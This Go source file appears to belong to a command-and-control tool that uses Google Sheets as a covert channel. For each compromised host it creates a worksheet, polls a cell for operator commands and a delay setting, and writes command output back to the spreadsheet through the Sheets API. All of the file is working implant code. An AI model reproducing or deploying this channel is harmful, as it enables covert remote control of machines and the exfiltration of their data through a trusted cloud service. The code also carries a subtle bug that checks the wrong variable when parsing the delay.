package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

type GoogleCommandExecutor struct {
	client          *http.Client
	googleSheetID   string
	googleSheetName string
}

const sheetCommandCell = "A"
const sheetOutputStartCell = "B"
const sheetOutputEndCell = "C"
const sheetTickerCell = "E2"

type BatchUpdate struct {
	Requests                     []Request `json:"requests"`
	IncludeSpreadsheetInResponse bool      `json:"includeSpreadsheetInResponse"`
}

type Request struct {
	AddSheet AddSheetRequest `json:"addSheet"`
}

type AddSheetRequest struct {
	Properties SheetProperties `json:"properties"`
}

type SheetProperties struct {
	Title string `json:"title"`
}

type ValueRange struct {
	Range  string          `json:"range"`
	Values [][]interface{} `json:"values"`
}

var ErrorUnableToCreateGoogleSpreadsheet = fmt.Errorf("an error occurred while creating Google spreadsheet")
var ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration = fmt.Errorf("an error occurred while creating default Google spreadsheet configuration")

func NewGoogleCommandExecutor(connector *GoogleConnector) (*GoogleCommandExecutor, error) {
	googleCommandExecutor := &GoogleCommandExecutor{
		client:          connector.client,
		googleSheetID:   configuration.GetOptionsGoogleSheetID(),
		googleSheetName: utils.GetUniqueHostnameName(),
	}

	err := createGoogleWorksheet(googleCommandExecutor)
	if err != nil {
		return nil, err
	}

	return googleCommandExecutor, nil
}

func createGoogleWorksheet(commandExecutor *GoogleCommandExecutor) error {
	sheetName := commandExecutor.googleSheetName
	url := fmt.Sprintf(
		"https://sheets.googleapis.com/v4/spreadsheets/%s:batchUpdate",
		commandExecutor.googleSheetID,
	)

	var body []byte

	request := Request{
		AddSheet: AddSheetRequest{
			Properties: SheetProperties{
				Title: sheetName,
			},
		},
	}
	batchUpdate := BatchUpdate{
		Requests:                     []Request{request},
		IncludeSpreadsheetInResponse: false,
	}

	body, err := json.Marshal(batchUpdate)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
	}

	req, err := http.NewRequest("POST", url, strings.NewReader(string(body)))
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
	}

	_, err = commandExecutor.client.Do(req)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
	}

	// Adding ticker cells values
	tickerRange := fmt.Sprintf("%s!D2:%s", sheetName, sheetTickerCell)

	url = fmt.Sprintf(
		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s?valueInputOption=RAW",
		commandExecutor.googleSheetID,
		tickerRange,
	)

	var output [][]interface{}
	output = append(output, make([]interface{}, 2))

	output[0][0] = "Delay configuration (sec)"
	output[0][1] = DefaultTickerDuration

	valueRange := ValueRange{
		Range:  tickerRange,
		Values: output,
	}

	body, err = json.Marshal(valueRange)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToCreateGoogleSpreadsheet, err)
	}

	req, err = http.NewRequest("PUT", url, strings.NewReader(string(body)))
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration, err)
	}
	_, err = commandExecutor.client.Do(req)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToCreateDefaultGoogleSpreadsheetConfiguration, err)
	}
	return err

}

// TODO: merge two requests
func (g *GoogleCommandExecutor) pullCommandAndTicker(rowIndex int) (string, int, error) {
	var commandResult string
	var tickerDelayResult int

	rangeId := strconv.Itoa(rowIndex)
	// Example: Sheet1!A2
	readRange := fmt.Sprintf("%s!%s%s", g.googleSheetName, sheetCommandCell, rangeId)

	url := fmt.Sprintf(
		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s",
		g.googleSheetID,
		readRange,
	)

	request, err := http.NewRequest("GET", url, nil)

	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	resp, err := g.client.Do(request)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	var valueRange ValueRange
	err = json.NewDecoder(resp.Body).Decode(&valueRange)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	if valueRange.Values != nil {
		commandResult = valueRange.Values[0][0].(string)
	} else {
		commandResult = ""
	}

	// Ticker download
	readRange = fmt.Sprintf("%s!%s", g.googleSheetName, sheetTickerCell)
	url = fmt.Sprintf(
		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s",
		g.googleSheetID,
		readRange,
	)

	request, err = http.NewRequest("GET", url, nil)

	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	resp, err = g.client.Do(request)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	var item ValueRange
	err = json.NewDecoder(resp.Body).Decode(&item)
	if err != nil {
		return "", 0, fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
	}

	if valueRange.Values != nil {
		tickerDelayResult, err = strconv.Atoi(item.Values[0][0].(string))
		if err != nil {
			tickerDelayResult = 0
			err = fmt.Errorf("%w: %w", ErrorUnableToPullCommandAndTicker, err)
		}
	} else {
		tickerDelayResult = 0
	}

	return commandResult, tickerDelayResult, nil

}

func (g *GoogleCommandExecutor) pushOutput(rowIndex int, commandOutput string) error {
	rowId := strconv.Itoa(rowIndex)
	sheetRange := fmt.Sprintf(
		"%s!%s%s:%s%s",
		g.googleSheetName,
		sheetOutputStartCell,
		rowId,
		sheetOutputEndCell,
		rowId,
	)

	url := fmt.Sprintf(
		"https://sheets.googleapis.com/v4/spreadsheets/%s/values/%s?valueInputOption=RAW",
		g.googleSheetID,
		sheetRange,
	)

	var output [][]interface{}
	output = append(output, make([]interface{}, 2))

	output[0][0] = commandOutput
	output[0][1] = utils.GetCurrentDate()

	valueRange := ValueRange{
		Range:  sheetRange,
		Values: output,
	}

	var body []byte

	body, err := json.Marshal(valueRange)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	req, err := http.NewRequest("PUT", url, strings.NewReader(string(body)))

	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	_, err = g.client.Do(req)
	if err != nil {
		return fmt.Errorf("%w: %w", ErrorUnableToPushCommand, err)
	}

	return nil

}
